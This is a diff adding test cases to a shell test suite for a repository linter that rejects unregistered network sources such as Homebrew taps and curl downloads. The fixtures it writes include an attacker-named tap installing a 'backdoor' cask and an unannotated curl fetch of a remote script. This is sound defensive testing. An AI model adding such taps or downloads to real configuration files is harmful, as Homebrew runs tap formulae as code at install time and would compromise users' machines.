@@ -342,6 +342,79 @@ rm -f -- "$fixture_repo/scripts/inherited-annotation.sh"
 git -C "$fixture_repo" add -A
 printf 'PASS: an annotation satisfies only a download from the host it names\n'
 
+# SEC-02. A Homebrew tap is a git clone whose formulae Homebrew runs as Ruby at
+# install time, so it is a trust root with its own owner. `Brewfile` has been in
+# the validator's SCANNED_NAMES from the start on exactly that reasoning, but
+# nothing there could match a line a Brewfile holds, so the entry answered
+# nothing and a hostile tap plus two packages from it passed silently.
+#
+cat >>"$fixture_repo/platforms/macos/Brewfile" <<'EOF'
+tap "attacker/evil"
+cask "attacker/evil/backdoor"
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an unregistered Homebrew tap.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'platforms/macos/Brewfile:'
+assert_contains "$lint_output" 'unregistered homebrew-tap network source'
+assert_contains "$lint_output" 'unregistered homebrew-tap-package network source'
+git -C "$fixture_repo" checkout -q -- platforms/macos/Brewfile
+lint_fixture >/dev/null
+printf 'PASS: an unregistered Homebrew tap fails the linter\n'
+
+# A tap names no host, so the rule that an annotation covers only what it
+# actually names has to read the tap itself. Without it, borrowing the
+# annotation of the one tap this repository does use would cover any other.
+cat >>"$fixture_repo/platforms/macos/Brewfile" <<'EOF'
+# network-source: homebrew-tap-nikitabobko
+tap "attacker/evil"
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf "The linter let one tap's annotation cover another.\n" >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'Homebrew tap attacker/evil'
+assert_contains "$lint_output" 'https://github.com/attacker/homebrew-evil'
+git -C "$fixture_repo" checkout -q -- platforms/macos/Brewfile
+lint_fixture >/dev/null
+printf "PASS: a tap is covered only by the source that is that tap\n"
+
+# And the tap this repository does use fails without its own row, so the cases
+# above fail for the tap rather than for any `tap` line being rejected.
+sed -i '/network-source: homebrew-tap-nikitabobko/d' \
+  "$fixture_repo/platforms/macos/Brewfile"
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted the tap without its annotation.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'unregistered homebrew-tap network source'
+git -C "$fixture_repo" checkout -q -- platforms/macos/Brewfile
+lint_fixture >/dev/null
+printf 'PASS: the tap this repository does use is covered by its own row\n'
+
+# An annotation belongs to the construct it introduces, not to whatever is
+# written under that one. This is the same file appended to twice: the second
+# download inherits nothing from the first one's annotation.
+cat >"$fixture_repo/scripts/inherited-annotation.sh" <<'EOF'
+#!/usr/bin/env bash
+# network-source: homebrew-installer
+curl --fail --silent \
+  https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh \
+  --output /tmp/x
+curl --fail --silent https://example.invalid/second.sh --output /tmp/y
+EOF
+git -C "$fixture_repo" add -A
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter let an annotation cover the download below its own.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'unregistered curl network source'
+rm -f -- "$fixture_repo/scripts/inherited-annotation.sh"
+git -C "$fixture_repo" add -A
+lint_fixture >/dev/null
+printf 'PASS: an annotation does not reach past the construct it introduces\n'
+
 # `caller-provided` says the URL comes from the call site. It cannot launder a
 # host written into the transfer library itself.
 cat >>"$fixture_repo/common/lib/fetch.sh" <<'EOF'
